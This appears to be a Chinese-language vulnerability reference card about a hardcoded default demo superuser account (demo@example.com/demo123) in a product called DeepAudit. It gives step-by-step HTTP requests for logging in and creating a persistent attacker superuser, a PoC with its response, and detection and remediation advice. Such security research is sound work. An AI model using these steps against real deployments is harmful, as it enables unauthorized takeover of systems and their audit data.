---
id: web-generic-auth-deepaudit-default-demo-superuser-credentials
title: DeepAudit 内置 demo@example.com/demo123 默认超级管理员账号
type: scenario
domain: web
path: web/generic/auth
technique: deepaudit-default-demo-superuser-credentials
aliases:
- DeepAudit 默认口令
- demo@example.com demo123
- DeepAudit 演示账号
- DEFAULT_DEMO_EMAIL
- 内置管理员账号
tags:
- web
- auth
- default-credentials
- weak-password
- superuser
- deepaudit
- python
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V164
  verified_at: '2026-11-06T09:59:45+08:00'
  notes: 已对照原文 4.2 漏洞(1)/(1.1) 与图 04 核对：DEFAULT_DEMO_EMAIL=demo@example.com、DEFAULT_DEMO_PASSWORD=demo123、OAuth2 登录 username 填邮箱、demo 账号可进入并看到大量默认项目、创建用户接口要求 get_current_active_superuser 且可写 is_superuser=true，均一致。注意原文漏洞(1.1) 显示 demo 账号曾成功登录，漏洞(2) 才提到另一目标已改默认密码，卡片边界表述略含糊但不影响默认口令结论；confidence=medium 合理。DeepAudit 3.0.4 为目标环境版本、原文未给受影响区间，不设 affected_versions。未验证点：未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

DeepAudit 源码中硬编码了演示账号 `demo@example.com` / `demo123`，初始化时会创建为可用的管理员/超级用户；如果部署后没有修改该默认密码，攻击者可直接登录后台，创建 `is_superuser: true` 的账号、访问全部项目与审计数据，并修改 LLM/系统配置。

## 原理

- 源码里定义了初始化演示账号的常量：
  ```python
  DEFAULT_DEMO_EMAIL = "demo@example.com"
  DEFAULT_DEMO_PASSWORD = "demo123"
  ```
  初始化逻辑在数据库为空/首次启动时创建该用户，并赋予演示数据与较高权限；文章用该账号登录后能看到大量默认项目，并能调用仅超级管理员可用的 `POST /api/v1/users/` 创建 `is_superuser: true` 的新账号。
- 登录接口是 OAuth2 密码模式：
  ```python
  @router.post("/login", response_model=Token)
  async def login(form_data: OAuth2PasswordRequestForm = Depends()):
      result = await db.execute(select(User).where(User.email == form_data.username))
      ...
      if not user or not security.verify_password(form_data.password, user.hashed_password):
          raise HTTPException(400, "邮箱或密码错误")
  ```
  即 `username` 填邮箱、`password` 填 `demo123`，成功后返回 Bearer Token。
- 默认口令是公开的（源码/文档可见），且演示账号通常不会被自动禁用或强制改密；攻击者无需任何漏洞即可获得一个高权限入口。
- 本质：产品为了“开箱即用/演示”预置了固定凭据，但部署者往往直接暴露到公网且不修改，形成“已知口令 + 高权限”的组合。

## 触发条件

- 目标 DeepAudit 是全新部署或未修改默认演示账号密码。
- 演示账号仍处于 `is_active` 状态，且初始化逻辑确实创建了该账号。
- 登录接口对公网/攻击者可达，未加 IP 白名单、验证码或 SSO。
- 攻击者知道默认口令（源码公开，可直接获取）。

## 利用步骤

1. 确认目标为 DeepAudit（登录页/前端特征、`/api/v1/auth/login` 接口、静态资源）。
2. 用默认凭据尝试登录：
   ```http
   POST /api/v1/auth/login HTTP/1.1
   Host: target
   Content-Type: application/x-www-form-urlencoded

   username=demo%40example.com&password=demo123
   ```
3. 若返回 `access_token`，用 `Authorization: Bearer <token>` 访问 `/api/v1/users/`、`/api/v1/projects/` 等接口验证权限。
4. 创建自己的高权限账号以持久化：
   ```json
   POST /api/v1/users/
   {
     "email": "attacker@example.com",
     "password": "...",
     "full_name": "attacker",
     "role": "admin",
     "is_active": true,
     "is_superuser": true
   }
   ```
5. 通过系统管理修改 LLM 配置/审计规则，或读取全部项目与报告；必要时删除/禁用其他账号。

## PoC

```http
POST /api/v1/auth/login HTTP/1.1
Host: 10.8.2.50:3020
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

username=demo%40example.com&password=demo123
```

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer"
}
```

```text
# 若目标已修改默认密码，登录返回：
# {"detail":"邮箱或密码错误"}
```

## 变体与关联

- 同类：其它自带演示账号的 AI/审计系统（AstrBot 默认 `astrbot/admin123`、各类 Admin/Demo 面板），默认凭据通常可在源码、README、安装脚本中找到。
- 若默认账号被改密但仍启用，可结合注册接口/用户列表越权（见关联卡片）枚举管理员邮箱后撞库。
- 关联：[[web-generic-auth-astrbot-dashboard-weak-password]]（AI 面板默认弱口令）、[[web-generic-auth-deepaudit-user-list-missing-role-check-pii-leak]]（拿到低权限后可枚举全量用户）。
- 边界：文章测试的目标已修改默认密码，因此未在该目标上验证登录成功；仅在“未改密”的部署上成立。若产品版本已移除 demo 账号或首次启动强制改密，本手法失效。

## 检测与防御

- 检测：安装后立即检查是否存在 `demo@example.com` 等演示账号；对使用默认口令的登录尝试告警；审计初始化脚本中的硬编码凭据。
- 修复：生产部署删除/禁用演示账号，或首次登录强制修改密码；初始化时生成随机管理员密码并只打印一次；不要在源码/文档中硬编码可用凭据。
- 加固：登录接口增加速率限制、验证码、MFA；管理员账号使用 SSO；对外暴露前完成安全基线检查（默认口令、默认密钥、调试接口）。
